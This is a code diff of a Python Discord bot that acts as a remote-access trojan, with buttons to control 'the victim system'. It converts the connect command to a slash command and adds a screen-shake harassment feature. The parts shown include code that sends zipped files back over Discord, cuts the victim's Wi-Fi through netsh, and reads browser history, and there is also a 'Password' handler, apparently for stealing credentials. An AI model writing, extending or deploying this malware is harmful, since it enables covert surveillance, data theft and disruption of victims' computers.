@@ -42,6 +42,12 @@ LOG_CHANNEL_ID = int(config['log_channel_id'])
 
 @bot.event
 async def on_ready():
+    try:
+        synced = await bot.tree.sync()
+        print(f"Synced {len(synced)} slash commands")
+    except Exception as e:
+        print(f"Failed to sync slash commands: {e}")
+    
     channel = bot.get_channel(LOG_CHANNEL_ID)
     if channel:
         hostname = socket.gethostname()
@@ -67,12 +73,14 @@ async def on_ready():
         embed.add_field(name="CPU", value=cpu_info, inline=True)
         embed.add_field(name="GPU", value=gpu_info, inline=True)
         embed.add_field(name="Runtime", value=f"<t:{int(datetime.datetime.now().timestamp())}:R>", inline=False)
+        embed.add_field(name="Commands", value="Use `/connect` slash command to access controls", inline=False)
         
         await channel.send(embed=embed)
 
-@bot.command(name='connect')
-async def connect(ctx, ip: str):
-    if str(ctx.channel.id) != str(LOG_CHANNEL_ID):
+@bot.tree.command(name='connect', description='Connect to the victim system')
+async def connect_slash(interaction: discord.Interaction, ip: str):
+    if str(interaction.channel.id) != str(LOG_CHANNEL_ID):
+        await interaction.response.send_message("This command can only be used in the log channel.", ephemeral=True)
         return
     
     hostname = socket.gethostname()
@@ -98,8 +106,8 @@ async def connect(ctx, ip: str):
     embed.add_field(name="GPU", value=gpu_info, inline=True)
     embed.add_field(name="Runtime", value=f"<t:{int(datetime.datetime.now().timestamp())}:R>", inline=False)
     
-    view = ControlView(ctx.author.id)
-    await ctx.send(embed=embed, view=view)
+    view = ControlView(interaction.user.id)
+    await interaction.response.send_message(embed=embed, view=view)
 
 class ControlView(discord.ui.View):
     def __init__(self, author_id):
@@ -259,19 +267,62 @@ class ControlView(discord.ui.View):
         await interaction.followup.send(file=discord.File(zip_name))
         os.remove(zip_name)
 
-    @discord.ui.button(label="📶 Internet Lag", style=discord.ButtonStyle.danger, row=6)
+    @discord.ui.button(label="🖥️ Shake Screen", style=discord.ButtonStyle.danger, row=6)
+    async def shake_screen(self, interaction: discord.Interaction, button: discord.ui.Button):
+        import threading
+        import time
+        import random
+        
+        def shake_screen_continuous():
+            user32 = ctypes.windll.user32
+            screen_width = user32.GetSystemMetrics(0)
+            screen_height = user32.GetSystemMetrics(1)
+            
+            while True:
+                # Move the entire screen by changing display settings
+                try:
+                    # Create shake effect by moving windows
+                    def enum_windows_callback(hwnd, lParam):
+                        if win32gui.IsWindowVisible(hwnd):
+                            rect = win32gui.GetWindowRect(hwnd)
+                            x, y, w, h = rect
+                            offset_x = random.randint(-10, 10)
+                            offset_y = random.randint(-10, 10)
+                            win32gui.SetWindowPos(hwnd, win32con.HWND_TOP, x + offset_x, y + offset_y, w, h, win32con.SWP_NOSIZE)
+                    
+                    win32gui.EnumWindows(enum_windows_callback, None)
+                    time.sleep(0.1)
+                except:
+                    # Fallback: shake mouse cursor
+                    center_x = screen_width // 2
+                    center_y = screen_height // 2
+                    for dx, dy in [(5, 0), (-5, 0), (0, 5), (0, -5), (-5, -5), (5, 5), (-5, 5), (5, -5)]:
+                        try:
+                            user32.SetCursorPos(center_x + dx * 10, center_y + dy * 10)
+                            time.sleep(0.05)
+                        except:
+                            pass
+                time.sleep(0.05)
+        
+        # Start shaking in background thread
+        shake_thread = threading.Thread(target=shake_screen_continuous, daemon=True)
+        shake_thread.start()
+        
+        await interaction.response.send_message("🖥️ Screen shaking activated! The screen will continuously shake.")
+
+    @discord.ui.button(label="📶 Internet Lag", style=discord.ButtonStyle.danger, row=7)
     async def internet_lag(self, interaction: discord.Interaction, button: discord.ui.Button):
         subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=disable'])
         await asyncio.sleep(5)
         subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=enable'])
         await interaction.response.send_message("Internet lag triggered.")
 
-    @discord.ui.button(label="🚫 Disable Internet", style=discord.ButtonStyle.danger, row=6)
+    @discord.ui.button(label="🚫 Disable Internet", style=discord.ButtonStyle.danger, row=7)
     async def disable_internet(self, interaction: discord.Interaction, button: discord.ui.Button):
         subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=disable'])
         await interaction.response.send_message("Internet disabled.")
 
-    @discord.ui.button(label="📖 Browser History", style=discord.ButtonStyle.danger, row=6)
+    @discord.ui.button(label="📖 Browser History", style=discord.ButtonStyle.danger, row=8)
     async def browser_history(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer()
         
@@ -318,12 +369,12 @@ class ControlView(discord.ui.View):
         else:
             await interaction.followup.send("No browser history found.")
 
-    @discord.ui.button(label="💬 Message", style=discord.ButtonStyle.danger, row=7)
+    @discord.ui.button(label="💬 Message", style=discord.ButtonStyle.danger, row=8)
     async def message(self, interaction: discord.Interaction, button: discord.ui.Button):
         modal = MessageModal()
         await interaction.response.send_modal(modal)
 
-    @discord.ui.button(label="🔑 Password", style=discord.ButtonStyle.danger, row=7)
+    @discord.ui.button(label="🔑 Password", style=discord.ButtonStyle.danger, row=8)
     async def password(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer()
         
